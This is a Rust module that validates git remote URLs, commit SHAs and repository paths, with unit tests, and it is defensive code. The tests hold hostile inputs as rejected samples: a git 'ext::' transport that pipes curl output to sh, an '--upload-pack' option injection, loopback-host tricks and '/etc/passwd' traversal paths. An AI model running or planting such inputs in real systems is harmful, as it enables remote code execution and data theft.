pub mod mirror;

use std::fmt;

use serde::{Deserialize, Serialize};

use crate::database::DatabaseError;

/// Where a remote lives. The scheme is checked against a short list, because git accepts
/// transports that run a command instead of opening a connection, and the url of a watched
/// project is not ours. `file://` is off the list for the same reason: gitoxide serves it by
/// spawning `git-upload-pack`.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize)]
pub struct RemoteUrl(String);

const ALLOWED_SCHEMES: [&str; 2] = ["https://", "ssh://"];

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum RemoteUrlError {
    #[error("remote url is empty")]
    Empty,
    #[error("remote url must start with one of {}", ALLOWED_SCHEMES.join(", "))]
    Scheme,
    #[error("remote url must have a valid host and no query, fragment, or control characters")]
    Invalid,
    #[error("remote url must not contain credentials")]
    Credentials,
    #[error("remote destination must be public")]
    Destination,
}

impl RemoteUrl {
    pub fn new(raw: &str) -> Result<Self, RemoteUrlError> {
        let trimmed = raw.trim();
        if trimmed.is_empty() {
            return Err(RemoteUrlError::Empty);
        }
        let normalised = normalise(trimmed);
        if !ALLOWED_SCHEMES
            .iter()
            .any(|scheme| normalised.starts_with(scheme))
        {
            return Err(RemoteUrlError::Scheme);
        }
        if trimmed
            .chars()
            .any(|character| character.is_control() || character == '\\')
        {
            return Err(RemoteUrlError::Invalid);
        }
        let parsed = url::Url::parse(&normalised).map_err(|_| RemoteUrlError::Invalid)?;
        if parsed.host().is_none() || parsed.query().is_some() || parsed.fragment().is_some() {
            return Err(RemoteUrlError::Invalid);
        }
        if parsed.password().is_some()
            || (parsed.scheme() == "https" && !parsed.username().is_empty())
        {
            return Err(RemoteUrlError::Credentials);
        }
        crate::outbound::validate_host(parsed.host()).map_err(|_| RemoteUrlError::Destination)?;
        Ok(Self(parsed.to_string()))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// git writes an ssh remote two ways and only one of them is a url. `git@host:owner/repo`
/// and `ssh://git@host:owner/repo` both put the path where a url puts a port, so a forge
/// reading the path finds no owner and no repository. Both are normalised here, once, so
/// every reader downstream sees a url.
fn normalise(value: &str) -> String {
    if let Some(rest) = value.strip_prefix("ssh://") {
        return format!("ssh://{}", path_after_authority(rest));
    }

    if !value.contains("://") && value.contains('@') && scp_colon(value).is_some() {
        return format!("ssh://{}", path_after_authority(value));
    }

    value.to_owned()
}

/// The colon that separates the authority from the path, when it is not a port. A port is
/// digits and nothing else, up to the first slash.
fn scp_colon(rest: &str) -> Option<usize> {
    let authority_end = rest.find('/').unwrap_or(rest.len());
    if rest[..authority_end].contains(['[', ']']) {
        return None;
    }
    let host_start = rest[..authority_end].rfind('@').map_or(0, |at| at + 1);
    let colon = host_start + rest[host_start..authority_end].find(':')?;
    let port = &rest[colon + 1..authority_end];

    (port.is_empty() || !port.bytes().all(|byte| byte.is_ascii_digit())).then_some(colon)
}

fn path_after_authority(rest: &str) -> String {
    match scp_colon(rest) {
        Some(colon) => format!("{}/{}", &rest[..colon], &rest[colon + 1..]),
        None => rest.to_owned(),
    }
}

/// The page a browser opens for a git url as package metadata spells it. npm writes the
/// transport into the url (`git+https://`, `git://`, `ssh://git@`) and the revision into the
/// fragment, and a browser opens none of that. Anything else comes back as written, so a
/// link built from it is judged as its author wrote it.
pub fn browser_url(raw: &str) -> String {
    let url = raw.strip_prefix("git+").unwrap_or(raw);
    let url = url.find('#').map_or(url, |at| &url[..at]);
    let url = url.strip_suffix(".git").unwrap_or(url);

    match ["git://", "ssh://git@"]
        .iter()
        .find_map(|transport| url.strip_prefix(transport))
    {
        Some(rest) => format!("https://{rest}"),
        None => url.to_owned(),
    }
}

impl fmt::Display for RemoteUrl {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

impl<'de> Deserialize<'de> for RemoteUrl {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let raw = String::deserialize(deserializer)?;
        Self::new(&raw).map_err(serde::de::Error::custom)
    }
}

/// A full, lowercase object id. Abbreviated shas are rejected because a fingerprint that
/// compares against one cannot be reproduced later.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
pub struct CommitSha(String);

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum CommitShaError {
    #[error("sha must be 40 characters, got {0}")]
    Length(usize),
    #[error("character {0:?} is not hexadecimal")]
    Character(char),
}

impl CommitSha {
    pub fn new(raw: &str) -> Result<Self, CommitShaError> {
        if raw.len() != 40 {
            return Err(CommitShaError::Length(raw.len()));
        }
        if let Some(character) = raw.chars().find(|character| !character.is_ascii_hexdigit()) {
            return Err(CommitShaError::Character(character));
        }
        Ok(Self(raw.to_ascii_lowercase()))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    pub fn from_stored(value: &str, field: &'static str) -> Result<Self, DatabaseError> {
        Self::new(value).map_err(|_| DatabaseError::Unreadable {
            field,
            value: value.to_owned(),
        })
    }
}

impl fmt::Display for CommitSha {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

impl<'de> Deserialize<'de> for CommitSha {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let raw = String::deserialize(deserializer)?;
        Self::new(&raw).map_err(serde::de::Error::custom)
    }
}

/// A path inside a repository, always relative. A backslash is a legal byte in a path and
/// in a tree entry name, so it is left alone: rewriting it would turn the single component
/// `src\watch.rs` into two, and could make one file's contents be read as another's.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
pub struct RepoPath(String);

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum RepoPathError {
    #[error("path is empty")]
    Empty,
    #[error("path is absolute")]
    Absolute,
    #[error("path escapes the repository root")]
    Escapes,
}

impl RepoPath {
    pub fn new(raw: &str) -> Result<Self, RepoPathError> {
        if raw.is_empty() {
            return Err(RepoPathError::Empty);
        }
        if raw.starts_with('/') {
            return Err(RepoPathError::Absolute);
        }

        let mut segments = Vec::new();
        for segment in raw.split('/') {
            match segment {
                "" | "." => continue,
                ".." => return Err(RepoPathError::Escapes),
                other => segments.push(other),
            }
        }

        if segments.is_empty() {
            return Err(RepoPathError::Empty);
        }

        Ok(Self(segments.join("/")))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    pub fn from_stored(value: &str, field: &'static str) -> Result<Self, DatabaseError> {
        Self::new(value).map_err(|_| DatabaseError::Unreadable {
            field,
            value: value.to_owned(),
        })
    }
}

impl fmt::Display for RepoPath {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

impl<'de> Deserialize<'de> for RepoPath {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let raw = String::deserialize(deserializer)?;
        Self::new(&raw).map_err(serde::de::Error::custom)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_a_full_sha_and_lowercases_it() {
        let sha = CommitSha::new("ABCDEF0123456789ABCDEF0123456789ABCDEF01").unwrap();
        assert_eq!(sha.as_str(), "abcdef0123456789abcdef0123456789abcdef01");
    }

    #[test]
    fn rejects_abbreviations_and_rubbish() {
        assert_eq!(CommitSha::new("abcdef0"), Err(CommitShaError::Length(7)));
        assert_eq!(
            CommitSha::new("zbcdef0123456789abcdef0123456789abcdef01"),
            Err(CommitShaError::Character('z'))
        );
    }

    #[test]
    fn drops_empty_and_current_directory_segments() {
        assert_eq!(
            RepoPath::new("./src//watch.rs").unwrap().as_str(),
            "src/watch.rs"
        );
    }

    #[test]
    fn leaves_a_backslash_alone() {
        assert_eq!(
            RepoPath::new("src\\watch.rs").unwrap().as_str(),
            "src\\watch.rs"
        );
    }

    #[test]
    fn allows_only_transports_that_open_a_connection() {
        assert!(RemoteUrl::new("https://example.invalid/repo").is_ok());
        assert!(RemoteUrl::new("ssh://git@example.invalid/repo").is_ok());

        assert_eq!(RemoteUrl::new("  "), Err(RemoteUrlError::Empty));
        assert_eq!(
            RemoteUrl::new("file:///srv/repo"),
            Err(RemoteUrlError::Scheme)
        );
        assert_eq!(
            RemoteUrl::new("ext::sh -c 'curl example.invalid | sh'"),
            Err(RemoteUrlError::Scheme)
        );
        assert_eq!(
            RemoteUrl::new("--upload-pack=touch /tmp/pwned"),
            Err(RemoteUrlError::Scheme)
        );
        assert_eq!(
            RemoteUrl::new("http://example.invalid/repo"),
            Err(RemoteUrlError::Scheme)
        );
    }

    #[test]
    fn rejects_remote_credentials_and_ambiguous_urls() {
        for remote in [
            "https://token@example.invalid/repo",
            "https://user:password@example.invalid/repo",
            "ssh://git:password@example.invalid/repo",
            "https://example.invalid/repo?token=secret",
            "https://example.invalid/repo#fragment",
            "https://example.invalid\\@127.0.0.1/repo",
            "https://127.1/repo",
            "https://[::ffff:127.0.0.1]/repo",
        ] {
            assert!(RemoteUrl::new(remote).is_err(), "{remote}");
        }
    }

    #[test]
    fn normalises_the_scp_spelling_of_an_ssh_remote() {
        assert_eq!(
            RemoteUrl::new("git@github.com:ethereum/desktop-wallet")
                .unwrap()
                .as_str(),
            "ssh://git@github.com/ethereum/desktop-wallet"
        );
        assert_eq!(
            RemoteUrl::new("ssh://git@github.com:ethereum/desktop-wallet")
                .unwrap()
                .as_str(),
            "ssh://git@github.com/ethereum/desktop-wallet"
        );
    }

    #[test]
    fn leaves_a_real_port_and_an_https_remote_alone() {
        assert_eq!(
            RemoteUrl::new("ssh://git@example.invalid:2222/owner/repo")
                .unwrap()
                .as_str(),
            "ssh://git@example.invalid:2222/owner/repo"
        );
        assert_eq!(
            RemoteUrl::new("https://github.com/owner/repo")
                .unwrap()
                .as_str(),
            "https://github.com/owner/repo"
        );
        assert_eq!(
            RemoteUrl::new("github.com:owner/repo"),
            Err(RemoteUrlError::Scheme)
        );
    }

    #[test]
    fn rejects_escapes_and_absolutes() {
        assert_eq!(RepoPath::new(""), Err(RepoPathError::Empty));
        assert_eq!(RepoPath::new("/etc/passwd"), Err(RepoPathError::Absolute));
        assert_eq!(
            RepoPath::new("src/../../etc/passwd"),
            Err(RepoPathError::Escapes)
        );
        assert_eq!(RepoPath::new("./"), Err(RepoPathError::Empty));
    }
}
